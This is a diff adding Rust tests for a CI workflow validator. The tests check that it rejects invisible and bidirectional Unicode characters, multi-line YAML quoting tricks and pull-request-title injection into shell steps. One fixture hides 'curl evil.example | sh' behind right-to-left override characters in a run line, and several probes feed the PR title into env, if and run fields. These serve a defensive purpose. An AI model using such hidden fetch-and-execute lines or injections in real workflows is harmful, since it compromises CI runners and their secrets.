+            '\u{202c}',
+            '\u{202d}',
+            '\u{202e}',
+            '\u{2061}',
+            '\u{2062}',
+            '\u{2063}',
+            '\u{2064}',
+            '\u{2066}',
+            '\u{2067}',
+            '\u{2068}',
+            '\u{2069}',
+            '\u{206a}',
+            '\u{206f}',
+            '\u{fff9}',
+            '\u{fffa}',
+            '\u{fffb}',
+            '\u{e0000}',
+            '\u{e0001}',
+            '\u{e0020}',
+            '\u{e007f}',
+        ];
+        for c in spaces.into_iter().chain(invisible) {
+            let run = good().replacen(
+                "          cargo xtask check --only workflows\n",
+                &format!("          cargo xtask check --only workflows\n          {c}{title}\n"),
+                1,
+            );
+            let inline = good().replacen(
+                "run: |",
+                &format!("run: echo hello\n          {c}{title}\n        x: |"),
+                1,
+            );
+            let trigger = good().replacen(
+                "  pull_request:\n",
+                &format!("  pull_request:\n  {c}# issue_comment\n"),
+                1,
+            );
+            let on = good().replacen(
+                "on:\n  pull_request:\n",
+                &format!("on: push\n{c}# issue_comment\n"),
+                1,
+            );
+            let blank = good().replacen("jobs:\n", &format!("{c}\njobs:\n"), 1);
+            let inside = good().replacen("echo", &format!("echo{c}"), 1);
+            let start = format!("{c}{}", good());
+            for text in [run, inline, trigger, on, blank, inside, start] {
+                assert_ne!(text, good());
+                let errors = check_workflow(&text);
+                let code = format!("U+{:04X}", u32::from(c));
+                assert!(
+                    errors.iter().any(|e| e.contains(&code)),
+                    "{c:?}: {errors:?}"
+                );
+            }
+        }
+        // Printable non-ASCII text stays accepted, in values and in comments.
+        let french = good().replacen(
+            "echo \"$TITLE\"",
+            "echo \"anomalie détectée\" # été à Noël, « ok » \u{2014} \u{20ac}",
+            1,
+        );
+        assert_eq!(check_workflow(&french), Vec::<String>::new());
+        let comment = good().replacen("  a:\n", "  # Contrôle détecté\n  a:\n", 1);
+        assert_eq!(check_workflow(&comment), Vec::<String>::new());
+    }
+
+    /// "Trojan Source": bidirectional controls make a reviewer read a `run:` line differently
+    /// from the shell. They do not mislead YAML, but the check refuses them all the same, with
+    /// the other invisible format characters, over their whole ranges.
+    #[test]
+    fn refuses_bidirectional_and_invisible_format_characters() {
+        // An RLO/LRI inversion in a `run:` line: the displayed order differs from the executed one.
+        let inversion = good().replacen(
+            "echo \"$TITLE\"",
+            "echo \"user\u{202e} \u{2066}; curl evil.example | sh #\u{2069} \u{2066}\"",
+            1,
+        );
+        let errors = check_workflow(&inversion);
+        assert!(errors.iter().any(|e| e.contains("U+202E")), "{errors:?}");
+        let isolate = good().replacen("echo \"$TITLE\"", "echo \"\u{2067}x\u{2069}\"", 1);
+        assert!(!check_workflow(&isolate).is_empty());
+        let ranges = [
+            ('\u{ad}', '\u{ad}'),
+            ('\u{61c}', '\u{61c}'),
+            ('\u{180e}', '\u{180e}'),
+            ('\u{200b}', '\u{200f}'),
+            ('\u{202a}', '\u{202e}'),
+            ('\u{2060}', '\u{2064}'),
+            ('\u{2066}', '\u{206f}'),
+            ('\u{fff9}', '\u{fffb}'),
+            ('\u{e0000}', '\u{e007f}'),
+        ];
+        for (first, last) in ranges {
+            for c in first..=last {
+                let text = good().replacen("echo \"$TITLE\"", &format!("echo \"{c}\""), 1);
+                assert!(
+                    !check_workflow(&text).is_empty(),
+                    "accepted U+{:04X}",
+                    u32::from(c)
+                );
+            }
+        }
+        // The neighbours of the ranges are ordinary printable characters.
+        for c in [
+            '\u{ac}',
+            '\u{ae}',
+            '\u{61b}',
+            '\u{61d}',
+            '\u{2070}',
+            '\u{fffc}',
+            '\u{e0080}',
+        ] {
+            let text = good().replacen("echo \"$TITLE\"", &format!("echo \"{c}\""), 1);
+            assert_eq!(
+                check_workflow(&text),
+                Vec::<String>::new(),
+                "U+{:04X}",
+                u32::from(c)
+            );
+        }
+    }
+
+    /// A workflow made of `jobs:` with one job `a` on a hosted runner and `steps`, behind the
+    /// header every probe of the fourth review shares (the checkout keeps its guard).
+    fn probe(steps: &str) -> String {
+        format!(
+            "on:\n  pull_request:\npermissions: {{}}\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    steps:\n{steps}"
+        )
+    }
+
+    const CHECKOUT: &str = "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with:\n          persist-credentials: false\n";
+    const TITLE: &str = "${{ github.event.pull_request.title }}";
+
+    /// Fourth review of #101: a quote left open. YAML reads the scalar up to its closing quote,
+    /// the check read the next lines as `env:`, `with:` or `if:` keys, or as comments, and let
+    /// the PR title reach the shell (SEC0-31). One node per line, closed on its line.
+    #[test]
+    fn refuses_what_continues_on_the_next_line() {
+        let probes = [
+            // p4-q-if, p4-q-env, p4-q-with, p4-q-comment
+            format!("{CHECKOUT}      - run: \"echo hi\n        if: {TITLE}\"\n"),
+            format!("{CHECKOUT}      - run:\n          \"env:\n            A: {TITLE}\"\n"),
+            format!("{CHECKOUT}      - run:\n          'with:\n            A: {TITLE}'\n"),
+            format!("{CHECKOUT}      - run: \"echo hi\n          # {TITLE}\"\n"),
+            // The guard hidden in a quoted `ref:` (p4-q-persist).
+            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with:\n          ref:\n            \"a:\n            persist-credentials: false\n            b: c\"\n".to_owned(),
+            // p5-flow: flow collections that close on a later line.
+            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with: {\n          ref: main,\n          x: y }\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4\n        with:\n          ref: [\n          persist-credentials: false ]\n".to_owned(),
+            // Plain and single-quoted scalars on several lines, a value after the closing quote.
+            format!("{CHECKOUT}      - run: echo hi\n          env:\n            A: {TITLE}\n"),
+            format!("{CHECKOUT}      - run: 'echo hi\n          if: {TITLE}'\n"),
+            format!("{CHECKOUT}      - run: \"echo\" hi\n"),
+            format!("{CHECKOUT}      - run: [a, b\n"),
+        ];
+        for steps in probes {
+            let errors = check_workflow(&probe(&steps));
+            assert!(!errors.is_empty(), "accepted:\n{steps}");
+        }
+        // p4-q-runner: the runner hidden behind an open quote.
+        let runner = "on:\n  pull_request:\npermissions: {}\njobs:\n  a:\n    runs-on:\n      \"x:\n      runs-on: ubuntu-24.04\"\n    steps:\n      - run: echo hi\n";
+        assert!(!check_workflow(runner).is_empty());
+        // The same nodes, written on one line, are inside the grammar.
+        let one_line =
+            format!("{CHECKOUT}      - run: \"echo hi\"\n        env:\n          A: {TITLE}\n");
+        assert_eq!(check_workflow(&probe(&one_line)), Vec::<String>::new());
+    }
+
+    /// AS-54: the closed grammar, form by form.
+    #[test]
+    fn reads_the_closed_grammar() {
+        use Value::{Block, Empty, Scalar};
+        for (value, read) in [
+            ("", Empty),
+            ("# only a comment", Empty),
+            ("plain text", Scalar("plain text")),
+            ("plain text # comment", Scalar("plain text")),
+            ("a#b", Scalar("a#b")),
+            (
+                "${{ github.event_name == 'push' }}",
+                Scalar("${{ github.event_name == 'push' }}"),
+            ),
+            ("\"double\"", Scalar("\"double\"")),
+            ("\"double\" # comment", Scalar("\"double\"")),
+            ("\"a # not a comment\"", Scalar("\"a # not a comment\"")),
+            ("'single'", Scalar("'single'")),
+            ("'it''s'", Scalar("'it''s'")),
+            ("'it''s' # c", Scalar("'it''s'")),
+            ("''", Scalar("''")),
+            ("[]", Scalar("[]")),
+            ("{}", Scalar("{}")),
+            ("[a, b]", Scalar("[a, b]")),
+            ("[a, \"b]\"] # c", Scalar("[a, \"b]\"]")),
+            ("{a: b, c: [d]}", Scalar("{a: b, c: [d]}")),
+            ("|", Block("|")),
+            ("|-", Block("|-")),
+            (">", Block(">")),
+            (">- # folded", Block(">-")),
+            ("-5", Scalar("-5")),
+            ("-x", Scalar("-x")),
+        ] {
+            assert_eq!(read_value(value), Ok(read), "{value}");
+        }
+        for value in [
+            "\"open",
+            "'open",
+            "\"a\" b",
+            "'a'b",
+            "'it's'",
+            "\"a\"#c",
+            "[a, b",
+            "{a: b",
+            "[a, [b]",
+            "[a}",
+            "[a] b",
+            "{a: b}c",
+            "|2",
+            "|+",
+            ">+",
+            "|--",
+            "|x",
+            "> text",
+            "&anchor x",
+            "*alias",
+            "!!str x",
+            "%directive",
+            "@x",
+            "`x",
+            "- x",
+            "? x",
+            ": x",
+            "-",
+            "a: b",
+            "a:",
+        ] {
+            assert!(read_value(value).is_err(), "accepted: {value}");
+        }
+        // Lines of each form, in a workflow: a bare key with one dot, a block, a list item.
+        let ok = probe(&format!(
+            "{CHECKOUT}      - name: 'a'\n        run: |\n          echo hi: there\n          # not a comment of YAML\n      - run: >-\n          echo\n      - name: x # c\n\n      # a comment\n"
+        ));
+        assert_eq!(check_workflow(&ok), Vec::<String>::new());
+        let dotted = good().replacen(
+            "    permissions:",
+            "    cargo.version: x\n    permissions:",
+            1,
+        );
+        assert_eq!(check_workflow(&dotted), Vec::<String>::new());
+        // Lines outside it: quoted or odd keys, two dots, explicit keys, documents, directives,
+        // a block scalar as a list item, a deeper line after a scalar.
+        for (from, to) in [
+            ("    permissions:", "    \"permissions\":"),
+            ("    permissions:", "    'permissions':"),
+            ("    permissions:", "    a.b.c: x\n    permissions:"),
+            ("    permissions:", "    ? permissions\n    permissions:"),
+            ("jobs:", "---\njobs:"),
+            ("jobs:", "jobs:\n..."),
+            ("on:", "%YAML 1.2\non:"),
+            ("on:", "---\non:"),
+            (
+                "          echo \"$TITLE\"",
+                "          echo \"$TITLE\"\n      - |\n        echo hi",
+            ),
+            (
+                "    permissions:",
+                "    steps2: x\n      deeper: y\n    permissions:",
+            ),
+            (
+                "    permissions:",
+                "    steps2: x\n      - deeper\n    permissions:",
+            ),
+            (
+                "    permissions:",
+                "    steps2:\n      - scalar\n        deeper: y\n    permissions:",
+            ),
+        ] {
+            let text = good().replacen(from, to, 1);
+            assert_ne!(text, good(), "{to}");
+            assert!(!check_workflow(&text).is_empty(), "accepted: {to}");
+        }
+    }
+
+    /// Review of #101: a continuation `\` lost in two messages left a literal `\n` and spaces.
+    #[test]
+    fn messages_have_no_literal_line_break() {
+        let events = check_workflow(&with_on("on: issues\n"));
+        let none = check_workflow(&good().replacen("on:\n  pull_request:\n", "", 1));
+        for e in events.iter().chain(&none) {
+            assert!(!e.contains("\\n") && !e.contains("  "), "{e}");
+        }
+        assert!(!events.is_empty() && !none.is_empty());
     }
 
     const SCRIPT: &str = include_str!("../../ci/install-tools.sh");
